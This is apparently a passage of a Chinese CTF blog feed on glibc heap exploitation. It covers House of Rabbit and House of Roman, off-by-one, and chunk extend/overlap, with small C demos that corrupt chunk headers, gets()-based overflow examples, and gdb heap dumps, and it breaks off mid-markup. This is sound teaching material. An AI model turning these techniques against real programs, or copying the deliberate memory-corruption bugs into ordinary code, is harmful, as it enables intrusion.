</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0352| 0x602160 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0360| 0x602168 --&gt; 0x20ea1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line">chuck1[<span class="number">0</span>]=<span class="number">0x602060</span>;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment">(0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment">(0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment">(0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment">                  top: 0x6034f0 (size : 0x1fb10) </span></span><br><span class="line"><span class="comment">       last_remainder: 0x0 (size : 0x0) </span></span><br><span class="line"><span class="comment">            unsortbin: 0x0</span></span><br><span class="line"><span class="comment">(0x050)  smallbin[ 3]: 0x602000</span></span><br><span class="line"><span class="comment">(0x030)  smallbin[ 1]: 0x602060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>House of rabbit 的优点是容易构造 overlap chunk，由于可以基于 fastbin attack，甚至不需要 leak 就可以完成攻击。大家可以通过例题的练习加深对这个攻击的理解。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><ul><li>HITB-GSEC-XCTF 2018 mutepig</li></ul><h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。</p><h4 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h4><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="二进制" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="堆溢出" scheme="http://ggb0n.cool/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出基础</title>
    <link href="http://ggb0n.cool/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"/>
    <id>http://ggb0n.cool/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</id>
    <published>2020-06-01T02:02:45.000Z</published>
    <updated>2020-06-06T16:50:56.978Z</updated>
    
    <content type="html"><![CDATA[<p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。<a id="more"></a></p><p>不难发现，堆溢出漏洞发生的基本前提是：</p><ul><li>程序向堆上写入数据;</li><li>写入的数据大小没有被良好地控制。</li></ul><p>与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制EIP，一般来说，我们利用堆溢出的策略如下：</p><blockquote><ul><li>1、覆盖与其<strong>物理相邻的下一个 chunk</strong> 的如下内容：<ul><li>prev_size</li><li>size，主要有三个比特位，以及该堆块真正的大小：<br>NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE、the True chunk size</li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li>2、利用堆中的机制（如<code>unlink</code>等 ）来实现任意地址写入（<code>Write-Anything-Anywhere</code>）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ul></blockquote><h3 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h3><p>堆溢出中比较重要的几个步骤如下：</p><h4 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h4><p>通常来说堆是通过调用glibc函数<code>malloc</code>进行分配的，在某些情况下会使用<code>calloc</code>分配。<code>calloc</code>与<code>malloc</code>的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由<code>realloc</code>进行的，<code>realloc</code>函数可以身兼<code>malloc</code>和<code>free</code>两个函数的功能。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk,*chunk1;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  chunk1=<span class="built_in">realloc</span>(chunk,<span class="number">32</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>realloc</code>的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作：</p><blockquote><p>1、当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时：</p><ul><li><p>如果申请 size &gt; 原来size：</p><ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小；</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)。</li></ul></li><li><p>如果申请 size &lt; 原来 size：</p><ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变；</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分。</li></ul></li></ul><p>2、当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)；</p><p>3、当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作。</p></blockquote><h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。常见的危险函数如下：</p><ul><li>输入：<ul><li><code>gets</code>，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出：<ul><li>sprintf</li></ul></li><li>字符串处理函数：<ul><li><code>strcpy</code>，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li><code>strcat</code>，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上<code>ptmalloc</code>分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆内存结构如下：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据系统的位数，malloc会分配8或16字节的用户空间</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>注意：<code>chunk_hear.size = 用户区域大小 + 2 * 字长</code></p><p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的<code>prev_size</code>字段储存内容。回头再来看下之前的示例代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察如上代码，我们申请的 chunk 大小是<code>24</code>个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span></span><br></pre></td></tr></table></figure><p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的<code>prev_size</code>域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>当<code>req=24</code>时，<code>request2size(24)=32</code>。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 prev_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p><h3 id="堆中的经典漏洞及利用"><a href="#堆中的经典漏洞及利用" class="headerlink" title="堆中的经典漏洞及利用"></a>堆中的经典漏洞及利用</h3><p>堆同栈一样，存在许多经典的漏洞利用方式，下面对典型的漏洞利用技术进行学习记录。</p><h3 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h3><p>严格来说<code>off-by-one</code>漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且<strong>只越界了一个字节</strong>。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括：</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节；</li><li>字符串操作不合适（比如<code>strlen()</code>函数计算字符串长度时不考虑结束符<code>\x00</code>，而<code>strcpy()</code>函数在复制的时候会复制<code>\x00</code>，二者一起用就会导致off-by-one）。</li></ul><p>单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制<code>ptmalloc</code>验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。<br>此外，需要说明的一点是<code>off-by-one</code>是可以基于各种缓冲区的，比如<code>栈</code>、<code>bss 段</code>等等，但是堆上的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>1、溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法；</p><p>2、溢出字节为 NULL 字节：在 size 为256的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位（记录前一个 chunk 块是否被分配）被清，这样前块会被认为是 free 块。<br>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理;<br>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</p><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      <span class="built_in">size</span> += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h3><p><code>chunk extend</code>是堆漏洞的一种常见利用手法，通过<code>extend</code>可以实现<code>chunk overlapping</code>的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制<code>chunk header</code>中的数据</li></ul><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>1、在 ptmalloc 中，获取 chunk 块大小的操作如下，一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>2、在 ptmalloc 中，获取下一 chunk 块地址的操作如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。</p><p>3、在 ptmalloc 中，获取前一个 chunk 信息的操作如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p><p>4、在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。与 chunk extend 类似的还有一种称为 chunk shrink 的操作。</p><p>下面介绍各类型的 extend，参考的环境是 64 位的，因此偏移是 8 字节。</p><h4 id="类型1-对-inuse-的-fastbin-进行-extend"><a href="#类型1-对-inuse-的-fastbin-进行-extend" class="headerlink" title="类型1-对 inuse 的 fastbin 进行 extend"></a>类型1-对 inuse 的 fastbin 进行 extend</h4><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。示例程序如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当两个 malloc 语句执行之后，堆的内存分布如下：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>之后，我们把 chunk1 的 size 域更改为<code>0x41</code>，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示两个chunk大小之和为 0x40。在题目中这一步可以由堆溢出得到。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== 篡改大小</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span></span><br></pre></td></tr></table></figure><p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Fastbins[<span class="attribute">idx</span>=0, <span class="attribute">size</span>=0x10] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=1, <span class="attribute">size</span>=0x20] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=2, <span class="attribute">size</span>=0x30]  ←  Chunk(<span class="attribute">addr</span>=0x602010, <span class="attribute">size</span>=0x40, <span class="attribute">flags</span>=PREV_INUSE) </span><br><span class="line">Fastbins[<span class="attribute">idx</span>=3, <span class="attribute">size</span>=0x40] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=4, <span class="attribute">size</span>=0x50] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=5, <span class="attribute">size</span>=0x60] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=6, <span class="attribute">size</span>=0x70] 0x00</span><br></pre></td></tr></table></figure><p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">rax &#x3D; 0x602010</span><br></pre></td></tr></table></figure><h4 id="类型2-对-inuse-的-smallbin-进行-extend"><a href="#类型2-对-inuse-的-smallbin-进行-extend" class="headerlink" title="类型2-对 inuse 的 smallbin 进行 extend"></a>类型2-对 inuse 的 smallbin 进行 extend</h4><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 <code>0x70</code>）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;===chunk1 篡改size域</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== 防止合并的chunk</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== 被放入unsorted bin</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span> &lt;=== fd，bk</span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span 